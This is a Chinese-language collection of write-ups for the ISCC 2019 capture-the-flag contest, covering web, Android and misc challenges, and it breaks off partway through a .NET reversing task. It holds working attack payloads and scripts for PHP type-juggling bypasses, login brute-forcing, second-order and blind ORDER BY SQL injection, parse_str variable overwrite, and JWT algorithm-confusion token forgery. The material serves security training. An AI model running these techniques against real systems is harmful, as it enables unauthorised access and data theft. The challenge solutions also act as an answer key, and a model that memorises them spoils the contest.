# 2019ISCC

## 题目类型：

|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|易|

# 网上公开WP：

+ https://www.zhaoj.in/read-5629.html
+ https://www.anquanke.com/post/id/179216

# 题目下载:

+ 链接：https://pan.baidu.com/s/1JU2GTO-0yi6scU-M3bcavA 提取码：axba

# 本站备份WP
**感谢作者：Glzjin、Henu_摇光**

## Web

### web1

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583534628dfcb7a4d2d0015b63f17d5bbe6f8daa-1024x387.png)

靶机：[http://39.100.83.188:8001](http://39.100.83.188:8001/)

知识点：代码审计，PHP函数缺陷（特性？）

步骤：

1.打开靶机，又是直接看到源码了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558353654eb712a01f2037f7398f891478774ed17-1024x449.png)

```
<?php
error_reporting(0);
require 'flag.php';
$value = $_GET['value'];
$password = $_GET['password'];
$username = '';

for ($i = 0; $i < count($value); ++$i) {
    if ($value[$i] > 32 && $value[$i] < 127) unset($value);
    else $username .= chr($value[$i]);
    if ($username == 'w3lc0me_To_ISCC2019' && intval($password) < 2333 && intval($password + 1) > 2333) {
        echo 'Hello '.$username.'!', '<br>', PHP_EOL;
        echo $flag, '<hr>';
    }
}

highlight_file(__FILE__);
```

2.审代码。

首先看到从请求中获取了 value 和 password，其中 value 是个数组，先判断是否大于 33 小于 127，符合会被 unset 不处理，不符合的才基于 ASCII 码表将其中的元素逐个从数字转为字符，拼接成用户名。

然后判断用户名是否为 w3lc0me_To_ISCC2019，再判断用 intval 之后的 password 是否小于 2333， intval 之后的 password + 1 是否大于 2333。

3.看到这里，

+   首先是如何绕过那个 大于 33 小于  127 的判断，还要能让 username 能被正确拼接出来。
+   这里我们查一下 chr 函数的文档 [https://www.php.net/manual/en/function.chr.php](https://www.php.net/manual/en/function.chr.php)，里面有这样提到

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558355440bb0cd613b6abc1ece7ab32a4f1469b78-1024x226.png)

会对传入值取 256 模。那么我们传入一个大一些的数字就可以绕过了。

写个小脚本来生成 payload:

```
input_str = input()
result = ''

for i in input_str:
    result += '&value[]=' + str(ord(i) + 256)

print(result)
```

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583556990b48848924e487ad335b8d5686843992-1024x218.png)

> 对于 password 的判断，想起了 intval 的缺陷，只处理能处理的字符，比如对于 intval(&#8216;0x01&#8217;)，执行之后返回 0，但要是 intval(&#8216;0x01&#8217; + 1) 呢？PHP 会先将 &#8216;0x01&#8217; 视作十六进制数与 1 相加，再丢给 intval 处理，那么结果就是 2，可以用下面的代码进行测试。

```
<?php
//0
echo intval('0x01').' ';
//2
echo intval('0x01' + 1).' ';
```

4. OK，那对照 ASCII 码表，以及上面我们的结论，得出以下 payload:

```
/?password=0xaaaa&value[]=375&value[]=307&value[]=364&value[]=355&value[]=304&value[]=365&value[]=357&value[]=351&value[]=340&value[]=367&value[]=351&value[]=329&value[]=339&value[]=323&value[]=323&value[]=306&value[]=304&value[]=305&value[]=313
```

`0xaaaa = 43690 > 2333`

5. 请求一下~

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583557670dd9c75bf70bcda3921411d61cf801dd-1024x403.png)

6. Flag 到手~

### web2

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558352699b2a4546cfdc4319b5545b55c34c6de73-1024x366.png)

靶机：[http://39.100.83.188:8002/](http://39.100.83.188:8002/)

知识点：暴力破解，验证码绕过

步骤：

1.打开靶机，发现是个登录页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558352893c002d9de5d211ae54984c5373708af36.png)

2.测试登录，抓个包试试。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583529221e9d788abf29c6ae43d4a7ee8fdc25bb.png)

3.OK，既然提示了三位数字，那么就来暴力破解吧。

还观察到一个有意思的现象，要是不访问 /vcode.php，不产生 session，不带上 cookie 访问的话，那么验证码就形同虚设了，可以绕过了。

所以 Python 脚本如下：
```
import requests

# session = requests.Session()

for i in range(1, 999):
    password = str(i)
    if len(password) == 1:
        password = '00' + password
    elif len(password) == 2:
        password = '0' + password

    r = requests.post("http://39.100.83.188:8002/login.php", data = {'username': 'admin', 'pwd': password, 'Login': 'submit'})
    r.encoding = 'unicode'
    print(password + ' ' + r.text)
    if r.text != '密码错误':
        break
```

4.跑一下~

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155835318042e0b62b4714b2ff6d8a47655b794e42-1024x421.png)

5.Flag 到手~

### web3

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155835639054e1050b4489c3b5db8ff7ffe3655a1e-1024x387.png)

靶机：[http://39.100.83.188:8065/](http://39.100.83.188:8065/)

知识点：二次注入

原题以及注意：此题解法不确定，虽然是 SQLi-Labs 的原题[https://bbs.pediy.com/thread-251338.htm](https://bbs.pediy.com/thread-251338.htm)，但是大家都在试- -也不知道谁的方法对谁的方法错了。

步骤：

1.打开靶机。发现是这样一个页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558356528771a574625c65a354aea5bb0e38ef77d-1024x603.png)

页面标题为 Second Degree Injections，提示其为二次注入。

3.那么就来注册个带二次注入的账号试试。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558358146b744402c6919486fa5f6dd875172164f-1024x903.png)

4.再登录看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155835811882a50f9bf247e29cb68b9c74bd67c21c-1024x678.png)

5.重新改个密码，原密码我输入了 123456。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583581026ea7f31d541009a949a2635a690e7ef8-1024x753.png)

6. 点提交，猜测程序是直接调用用户名，传到 sql 请求的时候没做过滤，所以这里执行的 sql 语句就大概是`update users set password='123456' where username='admin'—-*****` ，可以直接改 admin 的密码了。看页面这个样子似乎是改成功了？

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558356812ee3200b0bc628b52463817d7a5b365bd-1024x174.png)

7.用 admin 和 123456 试试，登录成功。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155835826968076a71fa6d4aa467e514b779ace255-1024x559.png)

PS: 这里可以写个脚本 用 admin 和 123456 不断登录试试，总有师傅会把密码改成 123456，这样捡别人的也可以了。

8. Flag 到手~


### web4

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583517195ea52e4056889e2ffd8b04dbc1d5d888-1024x376.png)

靶机：[http://39.100.83.188:8066](http://39.100.83.188:8066/)

知识点：代码审计，函数使用不恰当，变量覆盖

原题：[https://www.securepatterns.com/2019/04/](https://www.securepatterns.com/2019/04/)

步骤：

1.打开靶机，发现直接显示了源码。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583519828898fcdbf3f594da23387da5abdd2b3b-1024x726.png)
```
<?php 
error_reporting(0); 
include("flag.php"); 
$hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'; 
$parsed = parse_url($_SERVER['REQUEST_URI']); 
if(isset($parsed["query"])){ 
    $query = $parsed["query"]; 
    $parsed_query = parse_str($query); 
    if($parsed_query!=NULL){ 
        $action = $parsed_query['action']; 
    } 

    if($action==="auth"){ 
        $key = $_GET["key"]; 
        $hashed_input = hash('sha256', $key); 
        if($hashed_input!==$hashed_key){ 
            die("&lt;img src='cxk.jpg'>"); 
        } 

        echo $flag; 
    } 
}else{ 
    show_source(__FILE__); 
}?>
```

2.审一下，发现了当传入的参数中 action 为 auth，并且 key 和 hashed_key 相等时，就给出 flag。

3.但注意，这里有用到一个非常危险的函数 parse_str，参看 [https://www.php.net/manual/zh/function.parse-str.php](https://www.php.net/manual/zh/function.parse-str.php) ，如果传入的是query_string（形如 a=1&amp;b=2 ），那么就会将其解析为变量（设置变量 a=1, b=2）

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558352351b295128a52f4410718eef41af31f438e-1024x245.png)

4.好说了，那么我们就可以玩变量覆盖了，将 hashed_key 覆盖为我们想要的值即可，那么这里我选择覆盖 sha256(&#8220;glzjin&#8221;) = b262138fc423f9f944a3161a28e3e7e3a1e779c39c5240f0399f923053e6e371，payload 如下：

`/?action=auth&key=glzjin&hashed_key=b262138fc423f9f944a3161a28e3e7e3a1e779c39c5240f0399f923053e6e371`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558352610746d417e021154f1526758b8c67bf41d-1024x110.png)

5. Flag 到手~

### web5

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155836322652a1ec4e8635cbea228b69f0b05fccf5-1024x423.png)

靶机：[http://39.100.83.188:8054/](http://39.100.83.188:8054/)

知识点：User-Agent 伪造，参数猜解，Order By 注入

步骤：

1.打开靶机，提示这种东西。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155836344539758dc103e524e536e5599c312ec688.png)

2.那看看伪造 User-Agent 能不能成。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558363563f1bed99f2b6154e00afa262babd715e5-1024x477.png)

Http 头设置 User-Agent 为 aaaUnion.373，成了！

3.然后提示要用户名，来猜测下参数试试。

更改请求为 POST，添加一个参数 username，再发出请求。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155836381785e298aae5f59c4a8be7130aa771ed26-1024x429.png)

OK，不再提示请输入用户名，username 这个参数猜出来了。

4.如法炮制，猜出 password 这个参数。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558363895444187d29d2c26370e0cc6332ebede99-1024x682.png)

5.提示组织成员密码即为 flag。那么我们就来看看有没有注入能读出 flag 吧。

6.测试注入点。第二列为用户名列。猜测第三列为密码列。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558365078fc3a90946c78d6176ec0bb461e6e5f2c-1024x475.png)

发现其屏蔽了很多东西，where，and，括号，等号，下划线都给屏蔽了。

7.尝试构造请求绕过验证，获取用户名 union_373_Tom。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558365211e09aecb4c00c9b67b12b9c47cfb920f0-1024x462.png)

相当于 `select * from table_name where username="*/*' and password='*/"`

等效于 `select * from table_name where username="*"`

`="*"`就任意匹配了，自己找个表做个实验可以验证。

相当于 `select * from table_name`

8.拿到用户名之后，来看看能不能搞到密码。

多方测试后，payload 如下
```
username=union_373_Tom' union all select 1,2,'1' /*
&password=*/ order by 3,2,'1
```

解释一下，这里会查询到两条记录，一条是 union_373_Tom 的（下文用原条目表示），还有一条是我们 union 进去的 2 的（下文用新条目表示）。

后面的 order by 排序是关键，首先对第三列也就是我们猜测的密码列进行排序，默认是升序的，字典序小的在前面。程序返回的都是排第一个的条目。

所以有三种情况，

+   要是新条目第三列密码列（上文 payload 里为 &#8216;1&#8217;）字典序小于原条目第三列密码列，返回的就是新条目。
+   要是相等就继续跳到第二列比较，第二列数据都是已知的，必然是新条目在前面。
+   要是大于就返回原条目了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558367280d1a5e719820fe5473c7e6ccca6968a23-1024x634.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558368239eb610b7f6ab74de9d5eb1ffa8b9e4720-1024x642.png)

构造了一个布尔条件，实现了我们可控的新条目的密码列与原条目密码列的字典序比较(小于等于)。

9.OK，那就说明我们可以构造请求，把原条目的密码给逐位跑出来了。

Python 脚本如下：
```
import binascii

import requests

url = "http://39.100.83.188:8054/"


def half(payload):
    low = 0
    high = 126
    while low <= high:
        mid = (low + high) / 2
        # 等效于 chr(int(mid)) <= chr(int(target))
        if http_get(payload + chr(int(mid))):
            low = mid + 1
        else:
            high = mid - 1
    mid_num = chr(int((low + high) / 2))
    return mid_num


def http_get(payload):
    str_16 = binascii.b2a_hex(payload.encode('utf-8'))
    print(str_16.decode())
    payload = "username=union_373_Tom'%20union%20all%20select%201%2C2%2C0x" + str_16.decode() + "%20%2F*&password=*%2F%20order%20by%203%2C2%2C'1"
    headers = {
        'user-agent': "aaaUnion.373",
        'Content-Type': "application/x-www-form-urlencoded"
    }

    response = requests.request("POST", url, data=payload, headers=headers)

    response.encoding = 'utf-8'

    if response.text.find('组织欢迎你，2!') != -1:
        return True
    else:
        return False


return_str = ''

# # 二分跑法
# 需要运行两次，中间有个特殊字符被过滤了- -
# 第一次：
# return_str = ''
# 第二次
# return_str = '1SCC_'
# while True:
#     temp_return_str = half(return_str)
#     if temp_return_str == '~':
#         break
#
#     return_str += temp_return_str
#     print(return_str)
# # 最后一位需要特殊处理，因为和原文相等了- -
# return_str = return_str[:-1] + chr(ord(return_str[-1]) + 1)

# 顺序跑法 需要请求 N*126 次 但只用运行一次
while True:
    for i in range(0, 127):
        temp_return_str = chr(i)
        if not http_get(return_str + temp_return_str):
            break

    if ord(temp_return_str) == 33:
        break

    return_str += chr(ord(temp_return_str) - 1)
    print(return_str)

print(return_str)
```

有两种跑法，二分和顺序，二分的话得运行两次，因为 order by 遇到下划线之类的符号似乎不得劲儿，顺序法的话还好，不受干扰。

关于这里

```
if ord(temp_return_str) == 33:
   break
```

这个 33，为 ASCII 的第一个可视字符（前面为空格）。 Mysql 似乎会忽略 ASCII 码小于 32 的不可视字符。而到了 33 一直跑下去，就永远是新条目字典序大，返回的就一直是原条目了。

10.运行脚本。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583688758b38aeb9bd59bce157a565828b3d718f-1024x452.png)

11.得到 Flag~

### web6

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558359102bfbb95cff4e2bb370b8119b7bcd9af66-1024x398.png)

靶机：[http://39.100.83.188:8053/](http://39.100.83.188:8053/)

原题：[https://www.anquanke.com/post/id/145540](https://www.anquanke.com/post/id/145540)

知识点：代码泄露，JWT 原理

步骤：

1.打开靶机，发现是这样一个页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558359571bd3ac4149f1edc3e042c8db0dcef9f4a-907x1024.png)

2.那么就先注册了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558360867ad333817bcc366504bb54b1b2d9246db-1024x470.png)

3.登录看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558360984666c793e84f1658a6a683e57a45c75e5-1024x999.png)

4.提交，抓包看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583612163f2540aafa50c3c0e8ccc329f557e078-1024x554.png)

5. **Authorization** 这个头特别有意思，BASE64 解码看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583613662c653723bbd0df3a0dc1efe8c14cabf1-1024x838.png)

6.看起来是 JWT，那么就到 [https://jwt.io/](https://jwt.io/) 解码看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558361581aba40968c77512c90a32a1c3df365df0-1024x655.png)

7.OK，那么再来看看网页源码。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558361635ae4c4a28c46bcf7dd77d22d5e72967a3-1024x558.png)

看到 /static/js/common.js，

最后有一段
```
function getpubkey(){
    /* 
    get the pubkey for test
    /pubkey/{md5(username+password)}
    */
}`
```
咦，这是可以泄露 pubkey 了- -？

8.那么就构造个访问看看，我的用户名 glzjin，密码 123456，那么 md5(&#8220;glzjin123456&#8221;) 就是 578a0a535bce1db2a2de0cd58b776ebf

访问 /pubkey/578a0a535bce1db2a2de0cd58b776ebf

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583619233868c8bb13c15246e7e47ad0faec979c-1024x157.png)

获得了 pubkey。

9. OK，那么我们来尝试更改一下 alg 所指代的算法，将其从 RS256 这种非对称加密改成 HS256 这种对称加密，这样我们有公钥就可以伪造 JWT Token 从而为所欲为了。

10.首先把 pubkey 存到一个文本文件里。空格换行自己处理好。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583620700bc9c2ab5fb4f5d8527b39c18b31aa13-1024x268.png)

11.然后用 Python 脚本来伪造令牌，payload 部分填写自己想要的内容。

```
import jwt

public = open('1.txt', 'r').read()
print(jwt.encode({"name": "glzjin","priv": "admin"}, key=public, algorithm='HS256'))
```

12.运行，报错了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558362157f180c4b78fe744fa49094b326638b005-1024x393.png)

Never mind，我们直接去库源码里把这一段删了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15583622033f1991033a57af0df8e9bd16124db25c-1024x867.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558362285fb440578de458476c9b319d4c04bc0ce-1024x527.png)

再运行，就可以得到新的 JWT Token 了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558362922f99f77d784825d7410f503ea0593b356-1024x208.png)

13.然后将这个 JWT Token 放到 LocalStorage 里，覆盖原先的 Token。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558362939a331005f6778cdd82cd9458e86b70e1e-1024x293.png)

14.list 一下，看到开头那里是 admin 留的东西。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155836299944d8e017444e733247efe9ab21e527d5-1024x399.png)

15.访问看看。/text/admin:22f1e0aa7a31422ad63480aa27711277

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558363072dd0840fe40b2aa86c1d13c294e4a777a-1024x192.png)

16. Flag 到手~

## Mobile

### Mobile01

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558405236335639e77663f86a1adf6a192a2964b8-1024x428.png)

附件：
[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/15584052560a51033ee79f9f22e231447653438e6f.zip)

知识点：Android逆向，NDK 静态分析

步骤：

1.安装一下，看看这是啥玩意儿。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558433924572dd6efc057126043bfb2ab72c076f7-1024x740.png)

输入注册码的话，会提示错误。

2.那么来解包看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558412307b4f6f5b787b1f1cfa4f20fbec929ef08-1024x580.png)

3.然后用 dex2jar 把 dex 给解解。

d2j-dex2jar.sh classes.dex

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155841237382aeeef960b15a728748de9c08c3ff51-1024x164.png)

4.然后用 jd-gui 打开看看。看到 com.iscc.crackme 的 MainActivity

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584124975d250ecbcd6d6fc491dd0b88429da5e6-1024x1016.png)

5.审下代码，看到那个按钮按下之后会调用 checkFirst  和 checkSecond 两个方法，checkFirst 里先判断长度是否为 16 位，然后依次判断各位上是否为大于 0 小于 9 的数字（1~8），符合要求就返回 True。而对于 checkSecond，我们需要到 NDK 里看看了。

6.这里我们选择 lib/x86 下的 so 来分析。拖进 ida。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558412820eec191d116d66cd7bb14326ad8b36c75-358x1024.png)

7.直接看到NDK调用的入口函数 Java_com_iscc_crackme_MainActivity_checkSecond，F5 看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584129376ab67b0f7d48ea13c3399b2d8c73702d-1024x812.png)

可以看到主要是 checkfirst 和 checkAgain 两个函数在起作用，并且传入他们的参数似乎就是从 Java 程序里传过来的参数&#8211;那个注册码。

8.先看 checkfirst。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584130609ec27ca195338cd03c827d685633a3b8.png)

上面两个判断（别问我- -这里我没看明白），决定是处理前八位还是后八位，然后在这八位里逐位看后面的是否大于前面的，那么前八位和后八位中就必然有一段是 12345678 了。

9.再来看看 checkAgain。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558413345f7ca5343dafccdda092c5df4b1134ef1-859x1024.png)

一样的套路，和之前一样的判断。v13 那里似乎是把前八位取出来了，并且将其转换为对应的整型数字 &#8211; 1（减去的是 ASCII 码 49，也就是字符 1）了，而 v9那里则是把后八位给取出来了，v10,v11,v12按照地址进行计算，则分别是第十位，第十五位，第十六位。

再来看下面的判断，首先是第十六位和第九位相加要等于 5+2（前面转换的时候每一位都减 1 了） 也就是 7，第十位与第十五位相加要等于 12 + 2（同上） 也就是14。

而两个循环嵌套的情况下，就是前八位先对自身比较，确保没有重复的数字，后八位也是如此。再就是要求拆开之后看，前八位和后八位，相同位置上的数之间的差的绝对值不能相等。举个例子，我们有 12345678 31524678，这里前八位 3 &#8211; 1 = 2，而后八位 5 &#8211; 3 =2 ，这样就不符合条件了。

有这些理论条件做基础，我们就可以编写程序来调用这个 so 库进行爆破了。

11.打开 AndroidStudio，新建一个 APP。包名要和被爆破的源 APP 一致，为 com.iscc.crackme。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558431250abadf8452a9fb21785829a31bd067d45-1024x821.png)

12.把之前解包出来的文件夹里的 libs 文件夹拷到我们创建的这个项目里。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584332807a406ee381f30a98428e814dda1797c2-1024x462.png)

13.修改 app 目录里的 build.gradle，添加如下的代码，使其打包时带上 NDK。

```
task nativeLibsToJar(type: Zip, description: "create a jar archive of the native libs") {
    destinationDir file("$projectDir/libs")
    baseName "Native_Libs2"
    extension "jar"
    from fileTree(dir: "libs", include: "**/*.so")
    into "lib"
}

tasks.withType(JavaCompile) {
    compileTask -> compileTask.dependsOn(nativeLibsToJar)
}
```

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584334240770bc864297cd29f71b28310a00bc0c-1024x794.png)

13.再修改 MainActivity，添加爆破相关逻辑。

package com.iscc.crackme;
```
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    static
    {
        System.loadLibrary("native-lib");
    }

    private TextView tv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        tv = this.findViewById(R.id.test);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                System.out.println("Start~");
                for(int i1 = 1; i1 &lt;= 8; i1++) {
                    for(int i2 = 1; i2 &lt;= 8; i2++) {
                        if(i1 == i2) {
                            continue;
                        }

                        for(int i3 = 1; i3 &lt;= 8; i3++) {
                            if(i1== i3 || i2 == i3) {
                                continue;
                            }

                            for(int i4 = 1; i4 &lt;= 8; i4++) {
                                if(i1 == i4 || i2 == i4 || i3 == i4) {
                                    continue;
                                }

                                for(int i5 = 1; i5 &lt;= 8; i5++) {
                                    if(i1 == i5 || i2 == i5 || i3 == i5 || i4 == i5) {
                                        continue;
                                    }

                                    for(int i6 = 1; i6 &lt;= 8; i6++) {
                                        if(i1 == i6 || i2 == i6 || i3 == i6 || i4 == i6 || i5 == i6) {
                                            continue;
                                        }

                                        for(int i7 = 1; i7 &lt;= 8; i7++) {
                                            if(i1 == i7 || i2 == i7 || i3 == i7 || i4 == i7 || i5 == i7 || i6 == i7) {
                                                continue;
                                            }

                                            for(int i8 = 1; i8 &lt;= 8; i8++) {
                                                if(i1 == i8 || i2 == i8 || i3 == i8 || i4 == i8 || i5 == i8 || i6 == i8 || i7 == i8) {
                                                    continue;
                                                }

                                                for(int i9 = 1; i9 &lt;= 8; i9++) {
                                                    for(int i10 = 1; i10 &lt;= 8; i10++) {
                                                        if(i9 == i10) {
                                                            continue;
                                                        }

                                                        for(int i11 = 1; i11 &lt;= 8; i11++) {
                                                            if(i9 == i11 || i10 == i11) {
                                                                continue;
                                                            }

                                                            for(int i12 = 1; i12 &lt;= 8; i12++) {
                                                                if(i9 == i12 || i10 == i12 || i11 == i12) {
                                                                    continue;
                                                                }

                                                                for(int i13 = 1; i13 &lt;= 8; i13++) {
                                                                    if(i9 == i13 || i10 == i13 || i11 == i13 || i12 == i13) {
                                                                        continue;
                                                                    }

                                                                    for(int i14 = 1; i14 &lt;= 8; i14++) {
                                                                        if(i9 == i14 || i10 == i14 || i11 == i14 || i12 == i14 || i13 == i14) {
                                                                            continue;
                                                                        }

                                                                        for(int i15 = 1; i15 &lt;= 8; i15++) {
                                                                            if(i9 == i15 || i10 == i15 || i11 == i15 || i12 == i15 || i13 == i15 || i14 == i15) {
                                                                                continue;
                                                                            }

                                                                            for(int i16 = 1; i16 &lt;= 8; i16++) {
                                                                                if(i9 == i16 || i10 == i16 || i11 == i16 || i12 == i16 || i13 == i16 || i14 == i16 || i15 == i16) {
                                                                                    continue;
                                                                                }

                                                                                String testStr = "";
                                                                                testStr += i1;
                                                                                testStr += i2;
                                                                                testStr += i3;
                                                                                testStr += i4;
                                                                                testStr += i5;
                                                                                testStr += i6;
                                                                                testStr += i7;
                                                                                testStr += i8;
                                                                                testStr += i9;
                                                                                testStr += i10;
                                                                                testStr += i11;
                                                                                testStr += i12;
                                                                                testStr += i13;
                                                                                testStr += i14;
                                                                                testStr += i15;
                                                                                testStr += i16;

                                                                                if(MainActivity.this.checkSecond(testStr)) {
                                                                                    System.out.println("Found!" + testStr);
                                                                                    break;
                                                                                }

                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }

                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                System.out.println("End~");

            }
        });
    }

    public native boolean checkSecond(String paramString);

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
```

写得丑了点，但速度还是挺快的。程序的主要目的就是生成符合上面分析出来的要求的注册码，然后传给 NDK 判断，找到返回为 True 的注册码。

项目打包：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/1558434004d291d2e0f9b18676b34d2debad7d9b89.zip)

14.运行，点一下，开跑。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155843387716829a93d740517441be9ce306260887-1024x629.png)

15.得到符合条件的 1234567836275184，填回去试试。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558433901d9f9db191677dbe19a0601775e21df2f-1024x740.png)

16.Flag 到手~将这个作为 Flag 提交即可~

## MISC

### 隐藏的信息

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558435025854066296070e13f81680f05bcfd32b3-1024x431.png)

附件：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/1558435045566773b68e18d60696d1a508a503e8c3.zip)

知识点：观察？

步骤：

1.解包之后打开看看这个文件。似乎都是八进制，那转 ASCII 字符试试。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558435119b5399d5cbc82887b1e36b955cede336f-1024x659.png)

2.不磨叽，上脚本。

```
import base64

f = open("message.txt", "r")

s = f.readline().split(' ')
result = ''

for i in s:
    if i != '':
        result += chr(int(i, 8))

f.close()

print(base64.b64decode(result))
```

3.运行。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558435197236a062c4788166370cfc93a3ed9255d-1024x195.png)

4.Flag 到手~

### 最危险的地方就是最安全的地方

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155843523682955e58c40ac157539e3e1e14ef423e-1024x438.png)

附件：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/15584352907afc4ab69ef3c7ca3e905903f171a46d.zip)

知识点：观察？

步骤：

1.解包，发现是个图片，而且打不开。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558435405fa4f00566e5bb2f8c321c969d7201261.png)

2.那么 binwalk 走一波，似乎是个压缩文件。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584354419b32639eac5ea2c6900661fded231a51-1024x656.png)

3.解压看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558435834138173825de9fed86eb32c116d6dc3af-1024x656.png)

4.进去一看，一大堆二维码。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558435908c51080f84101dc321ee8af4c549ee262-1024x580.png)

5.每一个二维码内容都差不多。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584363349940c5100c8024dafe5dc24a7cef9f9f-473x1024.png)

6.看一下详细信息，发现有一个二维码特别大。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558436398776e6b6ac25d97b8186b027961f931d9-1024x580.png)

7.hex 编辑器打开看看，发现这么一段。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558436562afcd8051dd46a3fc10025be9a0b4646d.png)

8.拷出来 Base64 解个码。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155843660251157d21bf5790705fbb4679fc1e3ad2-1024x1019.png)

9.Flag 到手~提交中间的即可。

##### 解密成绩单

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584367634554c2835700acad5f6fa8af5ec37a64-1024x457.png)

附件：

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/1558446460ad65669032cbb047ef5d6aa385d20ab3.zip)

知识点：.Net 反编译

步骤：

1.解压，是个 exe。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15584467969731387c97d85ab1281beba597393a42-1024x347.png)

2.PEID 看看，.Net？

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558446840e5aa3a3afcafb592970874cfbed4bbe3.png)

3.来，.Net 反编译走一波。[https://github.com/icsharpcode/ILSpy/releases](https://github.com/icsharpcode/ILSpy/releases)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155844760583a0452611d6e61ac5a859f5ce4b5bc6-1024x766.png)

4.然后来随意看看，看到 checkUsername 这个方法。看来用户名是 admin 了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558447875a42d4b59ae8c4302f4278604a0918598-1024x731.png)

